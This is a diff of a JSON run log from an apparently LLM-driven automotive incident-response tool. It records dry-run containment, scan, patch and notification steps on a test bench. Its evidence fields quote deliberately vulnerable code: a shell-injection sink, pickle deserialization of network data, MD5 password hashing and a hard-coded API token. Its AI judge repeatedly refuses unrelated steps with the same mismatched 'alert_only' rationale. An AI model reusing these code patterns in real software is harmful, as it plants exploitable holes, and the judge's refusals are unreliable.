-          "side_effect": "write",
-          "severity_min": "low",
-          "timeout_s": 30,
-          "retries": 1,
-          "pre": [],
-          "post": [],
-          "rollback_steps": [],
-          "requires_authorization": false,
-          "step_id": "46a5fb5e-417a-450a-b0c7-896ede172735",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "(no real binary)",
-            "params": {
-              "severity": "high",
-              "summary": "Brute-force pattern detected",
-              "rule_id": "LOG-AUTH-03",
-              "evidence": "12 failed auth attempts in 30 s, user='root'"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
-          "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         },
         {
           "rule_id": "CODE-003",
           "kind": "audit",
           "tool": "code.scrub_git_history",
           "params": {
-            "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM",
+            "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM",
             "pattern": "bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d"
           },
           "description": "generate a runbook to scrub the secret from git history",
@@ -964,16 +691,16 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": true,
-          "step_id": "728ddab8-aa9d-45bd-a253-71a88a6ad733",
+          "step_id": "4229f2d7-c604-4aa1-9840-a3e7a6a2da87",
           "status": "completed",
           "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
+          "started_at": "2026-06-03T19:44:59.723375",
+          "finished_at": "2026-06-03T19:44:59.723375",
           "output": {
             "dry_run": true,
             "would_invoke": "git",
             "params": {
-              "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM",
+              "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM",
               "pattern": "bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d"
             },
             "_status": "would-execute",
@@ -987,7 +714,7 @@
           "kind": "audit",
           "tool": "runtime.snapshot",
           "params": {
-            "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\mcp_workspace",
+            "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\mcp_workspace",
             "label": "can_injection"
           },
           "description": "snapshot the workspace for forensic analysis",
@@ -999,29 +726,20 @@
           "post": [],
           "rollback_steps": [],
           "requires_authorization": false,
-          "step_id": "4fda18b3-dbb3-413e-8254-018816f50d65",
-          "status": "completed",
-          "attempts": 1,
-          "started_at": "2026-06-03T15:21:17.462486",
-          "finished_at": "2026-06-03T15:21:17.462486",
-          "output": {
-            "dry_run": true,
-            "would_invoke": "tar",
-            "params": {
-              "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\mcp_workspace",
-              "label": "can_injection"
-            },
-            "_status": "would-execute",
-            "_real": false
-          },
+          "step_id": "94ad9be7-8c54-43cc-abbb-104589af69bd",
+          "status": "refused",
+          "attempts": 0,
+          "started_at": null,
+          "finished_at": null,
+          "output": null,
           "error": null,
-          "refusal_reason": null
+          "refusal_reason": "H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report."
         }
       ]
     },
     "audit_log": [
       {
-        "step_id": "3848ce9c-faac-4125-930a-8991cb4f96a4",
+        "step_id": "23e42437-0623-4785-b032-8c2d0e87ba89",
         "tool": "runtime.safe_mode",
         "kind": "contain",
         "status": "completed",
@@ -1029,7 +747,7 @@
         "attempts": 1
       },
       {
-        "step_id": "5b4a9294-fb6b-4eb6-acd9-8d6bd9f29cd9",
+        "step_id": "996f1cf0-2a54-424d-a542-42d257ed8d60",
         "tool": "network.isolate_node",
         "kind": "contain",
         "status": "completed",
@@ -1037,47 +755,23 @@
         "attempts": 1
       },
       {
-        "step_id": "05d3a937-3bb6-4428-b53b-8c36d8e52b09",
-        "tool": "firewall.rate_limit",
-        "kind": "contain",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "71556e0f-515d-4aa4-af2f-59eb502a3712",
-        "tool": "firewall.block_ipv4",
-        "kind": "contain",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "cb3a5712-5fd6-42b3-b1bf-27c69807b4f2",
+        "step_id": "0a1f5048-2487-4c2f-86fc-78642994d045",
         "tool": "code.static_scan",
         "kind": "observe",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "04393b07-35a3-48ac-8904-e99bc77f1a0a",
+        "step_id": "277a8cf8-602c-4fa5-8ead-59cac0b6adbb",
         "tool": "code.static_scan",
         "kind": "observe",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "e254f0d3-2213-4561-95fd-4c13d97d3459",
-        "tool": "observe.log_tail",
-        "kind": "observe",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "e061fc95-8c7a-4aa5-8a39-3df2271b2480",
+        "step_id": "497374ba-f357-4825-9014-27e941a220dd",
         "tool": "secrets.rotate",
         "kind": "eradicate",
         "status": "completed",
@@ -1085,7 +779,7 @@
         "attempts": 1
       },
       {
-        "step_id": "8d32a9e0-324e-4c31-a3a1-7b5450c93bfd",
+        "step_id": "3050839a-517b-4d3a-852a-3d446e2afc21",
         "tool": "code.propose_patch",
         "kind": "eradicate",
         "status": "completed",
@@ -1093,7 +787,7 @@
         "attempts": 1
       },
       {
-        "step_id": "cf137a43-60d7-42ac-8a61-2214f47c3e2f",
+        "step_id": "8cf83d9e-6c6e-4dd0-b2ef-0c968abcc765",
         "tool": "code.propose_patch",
         "kind": "eradicate",
         "status": "completed",
@@ -1101,7 +795,7 @@
         "attempts": 1
       },
       {
-        "step_id": "48b8fd34-4fa4-4d63-b57a-5850423da0cc",
+        "step_id": "45e6c112-1df6-444a-82f2-fd200b7ec813",
         "tool": "code.propose_patch",
         "kind": "eradicate",
         "status": "completed",
@@ -1109,7 +803,7 @@
         "attempts": 1
       },
       {
-        "step_id": "703c1c5f-d200-4034-abac-197ad25022cf",
+        "step_id": "ca5998aa-df44-4806-9a6c-f67a990ea06c",
         "tool": "code.propose_patch",
         "kind": "eradicate",
         "status": "completed",
@@ -1117,7 +811,7 @@
         "attempts": 1
       },
       {
-        "step_id": "72e2b70c-38d0-4a16-a2f0-97f3ec956337",
+        "step_id": "fdc6eb8b-8b70-4413-b54c-30bd3584f28c",
         "tool": "code.propose_patch",
         "kind": "eradicate",
         "status": "completed",
@@ -1125,95 +819,87 @@
         "attempts": 1
       },
       {
-        "step_id": "35c5fbc8-6f3b-4ed7-9a83-29479a0e36c1",
+        "step_id": "b8a49772-1ab2-4f1f-88d0-b62a808620a2",
         "tool": "notify.create_incident",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "00f00aab-ed29-48e9-ba45-732e6e7bfe94",
+        "step_id": "88d52b96-26c4-4264-8304-0c73e5083754",
         "tool": "notify.create_incident",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "01f59bd8-0011-405b-9a41-b8db92160083",
+        "step_id": "2f1389a0-291b-4777-bd98-b7fab3eef1d1",
         "tool": "notify.driver",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "50f29dc6-5771-4c98-ac9e-758e33fcb36b",
+        "step_id": "63bd90f6-c6cf-4b47-af53-15bdd9638ec0",
         "tool": "notify.create_incident",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "c6188e51-9ae1-4847-8b01-7582578eb173",
+        "step_id": "a6c01ec0-56ea-4e86-9967-b435250349f5",
         "tool": "notify.create_incident",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "49d5876c-e179-4fb6-a126-2d30c669091e",
+        "step_id": "5349c396-53b9-49ed-b256-1c9dbc4ae61c",
         "tool": "notify.create_incident",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "4a55363f-1545-4f0c-bac5-eda81c375441",
+        "step_id": "0ab48592-76ab-4037-9daf-faa22f995873",
         "tool": "notify.create_incident",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "d9d8554d-f264-444e-affa-4cfac0f257e9",
+        "step_id": "8848e162-aff1-4f9e-b040-f39fc2efad58",
         "tool": "notify.create_incident",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "4560a414-e662-45f6-ab39-cc7921fead51",
+        "step_id": "2b4c6007-0e45-4312-8815-6a55ded55a43",
         "tool": "notify.create_incident",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "24166842-8d26-4fd8-a030-e38f22de53d8",
+        "step_id": "93377ce0-0e40-40fe-ad4b-a1a046494a6d",
         "tool": "notify.create_incident",
         "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       },
       {
-        "step_id": "46a5fb5e-417a-450a-b0c7-896ede172735",
-        "tool": "notify.create_incident",
-        "kind": "notify",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
-      },
-      {
-        "step_id": "728ddab8-aa9d-45bd-a253-71a88a6ad733",
+        "step_id": "4229f2d7-c604-4aa1-9840-a3e7a6a2da87",
         "tool": "code.scrub_git_history",
         "kind": "audit",
         "status": "completed",
@@ -1221,23 +907,23 @@
         "attempts": 1
       },
       {
-        "step_id": "4fda18b3-dbb3-413e-8254-018816f50d65",
+        "step_id": "94ad9be7-8c54-43cc-abbb-104589af69bd",
         "tool": "runtime.snapshot",
         "kind": "audit",
-        "status": "completed",
-        "msg": "completed",
-        "attempts": 1
+        "status": "refused",
+        "msg": "refused by guard: H_a judge refused: The action 'alert_only' does not directly contribute to producing a findings report. Alerting the security team may inform them of an issue, but it does not produce a report itself. Additional actions such as analysis and documentation are required to fulfill the objective of producing a findings report.",
+        "attempts": 0
       }
     ]
   },
   "mcp_audit": [
     {
-      "ts": "2026-06-03T15:21:17.461",
+      "ts": "2026-06-03T19:44:57.775",
       "tool": "runtime.safe_mode",
       "side_effect": "destructive",
       "real_invoked": false,
       "dry_run": true,
-      "elapsed_ms": 0.0,
+      "elapsed_ms": 0.01,
       "status": "would-execute",
       "params": {
         "target": "TESTBENCH-01"
@@ -1252,7 +938,7 @@
       "error": null
     },
     {
-      "ts": "2026-06-03T15:21:17.461",
+      "ts": "2026-06-03T19:44:57.775",
       "tool": "network.isolate_node",
       "side_effect": "destructive",
       "real_invoked": false,
@@ -1274,128 +960,12 @@
       "error": null
     },
     {
-      "ts": "2026-06-03T15:21:17.461",
-      "tool": "firewall.rate_limit",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "ipv4": "0.0.0.0",
-        "rate_per_minute": 6,
-        "duration_minutes": 30
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "ipv4": "0.0.0.0",
-          "rate_per_minute": 6,
-          "duration_minutes": 30
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.461",
-      "tool": "firewall.block_ipv4",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "ipv4": "0.0.0.0",
-        "duration_minutes": 60,
-        "reason": "LOG-AUTH-03"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "netsh",
-        "params": {
-          "ipv4": "0.0.0.0",
-          "duration_minutes": 60,
-          "reason": "LOG-AUTH-03"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "code.static_scan",
-      "side_effect": "read",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "path": "02_can_gateway.py",
-        "analyser": "auto"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "bandit",
-        "params": {
-          "path": "02_can_gateway.py",
-          "analyser": "auto"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "code.static_scan",
-      "side_effect": "read",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-        "analyser": "auto"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "bandit",
-        "params": {
-          "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-          "analyser": "auto"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "observe.log_tail",
-      "side_effect": "read",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\logs\\03_can_injection.log",
-        "pattern": "Failed password",
-        "timeout_s": 5
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\logs\\03_can_injection.log",
-          "pattern": "Failed password",
-          "timeout_s": 5
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
+      "ts": "2026-06-03T19:44:59.722",
       "tool": "secrets.rotate",
       "side_effect": "destructive",
       "real_invoked": false,
       "dry_run": true,
-      "elapsed_ms": 0.0,
+      "elapsed_ms": 0.01,
       "status": "would-execute",
       "params": {
         "secret_id": "***redacted***"
@@ -1410,7 +980,7 @@
       "error": null
     },
     {
-      "ts": "2026-06-03T15:21:17.462",
+      "ts": "2026-06-03T19:44:59.723",
       "tool": "code.propose_patch",
       "side_effect": "write",
       "real_invoked": false,
@@ -1436,7 +1006,7 @@
       "error": null
     },
     {
-      "ts": "2026-06-03T15:21:17.462",
+      "ts": "2026-06-03T19:44:59.723",
       "tool": "code.propose_patch",
       "side_effect": "write",
       "real_invoked": false,
@@ -1462,7 +1032,7 @@
       "error": null
     },
     {
-      "ts": "2026-06-03T15:21:17.462",
+      "ts": "2026-06-03T19:44:59.723",
       "tool": "code.propose_patch",
       "side_effect": "write",
       "real_invoked": false,
@@ -1488,7 +1058,7 @@
       "error": null
     },
     {
-      "ts": "2026-06-03T15:21:17.462",
+      "ts": "2026-06-03T19:44:59.723",
       "tool": "code.propose_patch",
       "side_effect": "write",
       "real_invoked": false,
@@ -1497,8 +1067,8 @@
       "status": "would-execute",
       "params": {
         "rule_id": "CODE-001",
-        "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-        "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: subprocess.call(user_input, shell=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
+        "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+        "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: return subprocess.check_output(f\"sysdiag --actuator={actuator_name} --json\", shell=True, text=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
         "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
       },
       "result_payload": {
@@ -1506,15 +1076,15 @@
         "would_invoke": "(no real binary)",
         "params": {
           "rule_id": "CODE-001",
-          "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-          "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: subprocess.call(user_input, shell=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
+          "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+          "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-001  (high)\n# evidence: return subprocess.check_output(f\"sysdiag --actuator={actuator_name} --json\", shell=True, text=True)\n# remediation: replace `subprocess.call(x, shell=True)` with\n    `subprocess.run(shlex.split(x), check=True)`\n    and validate `x` against an allow-list.\n",
           "rationale": "Replace the dangerous construct with the safe equivalent recommended in the rule."
         }
       },
       "error": null
     },
     {
-      "ts": "2026-06-03T15:21:17.462",
+      "ts": "2026-06-03T19:44:59.723",
       "tool": "code.propose_patch",
       "side_effect": "write",
       "real_invoked": false,
@@ -1522,299 +1092,25 @@
       "elapsed_ms": 0.0,
       "status": "would-execute",
       "params": {
-        "rule_id": "CODE-002",
-        "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-        "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-002  (medium)\n# evidence: hashlib.md5(password)\n# remediation: replace `hashlib.md5(p)` with `argon2.PasswordHasher().hash(p)`.\n",
+        "rule_id": "CODE-040",
+        "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+        "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-040  (high)\n# evidence: gateway_loop()\n# remediation: follow the rule's remediation guidance.\n",
         "rationale": "Auto-generated remediation proposal."
       },
       "result_payload": {
         "dry_run": true,
         "would_invoke": "(no real binary)",
         "params": {
-          "rule_id": "CODE-002",
-          "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\examples\\small\\02_can_gateway.py",
-          "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-002  (medium)\n# evidence: hashlib.md5(password)\n# remediation: replace `hashlib.md5(p)` with `argon2.PasswordHasher().hash(p)`.\n",
+          "rule_id": "CODE-040",
+          "file": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM\\examples\\small\\02_can_gateway.py",
+          "diff": "--- a/unknown.py\n+++ b/unknown.py\n@@ context-of-finding @@\n# rule_id: CODE-040  (high)\n# evidence: gateway_loop()\n# remediation: follow the rule's remediation guidance.\n",
           "rationale": "Auto-generated remediation proposal."
         }
       },
       "error": null
     },
     {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "critical",
-        "summary": "Hard-coded secret in source",
-        "rule_id": "CODE-003",
-        "evidence": "02_can_gateway.py: n-can   GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"   # CODE-003   @dat"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "critical",
-          "summary": "Hard-coded secret in source",
-          "rule_id": "CODE-003",
-          "evidence": "02_can_gateway.py: n-can   GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"   # CODE-003   @dat"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "critical",
-        "summary": "CODE-005: Unsafe deserialization (pickle / yaml.load / eval)",
-        "rule_id": "CODE-005",
-        "evidence": "02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "critical",
-          "summary": "CODE-005: Unsafe deserialization (pickle / yaml.load / eval)",
-          "rule_id": "CODE-005",
-          "evidence": "02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.driver",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "vehicle": "TESTBENCH-01",
-        "message": "Safety-critical bus anomaly detected. Vehicle is in limited mode \u2014 please pull over safely.",
-        "urgency": "critical"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "vehicle": "TESTBENCH-01",
-          "message": "Safety-critical bus anomaly detected. Vehicle is in limited mode \u2014 please pull over safely.",
-          "urgency": "critical"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "CODE-006: TLS certificate verification disabled",
-        "rule_id": "CODE-006"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "CODE-006: TLS certificate verification disabled",
-          "rule_id": "CODE-006"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "CODE-001: Shell-injection sink fed by untrusted input.",
-        "rule_id": "CODE-001",
-        "evidence": "subprocess.call(user_input, shell=True)"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "CODE-001: Shell-injection sink fed by untrusted input.",
-          "rule_id": "CODE-001",
-          "evidence": "subprocess.call(user_input, shell=True)"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "LOG-NET-01: log anomaly",
-        "rule_id": "LOG-NET-01",
-        "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "LOG-NET-01: log anomaly",
-          "rule_id": "LOG-NET-01",
-          "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "TOP-001: HPC\u2194ZoneECU must be Ethernet/IEEE-1722",
-        "rule_id": "TOP-001"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "TOP-001: HPC\u2194ZoneECU must be Ethernet/IEEE-1722",
-          "rule_id": "TOP-001"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "TOP-002: External actors must not write to long-term memory",
-        "rule_id": "TOP-002"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "TOP-002: External actors must not write to long-term memory",
-          "rule_id": "TOP-002"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "TOP-007: Brake ECU receives commands from non-brake source",
-        "rule_id": "TOP-007"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "TOP-007: Brake ECU receives commands from non-brake source",
-          "rule_id": "TOP-007"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "medium",
-        "summary": "CODE-002: Weak hash algorithm for password storage.",
-        "rule_id": "CODE-002"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
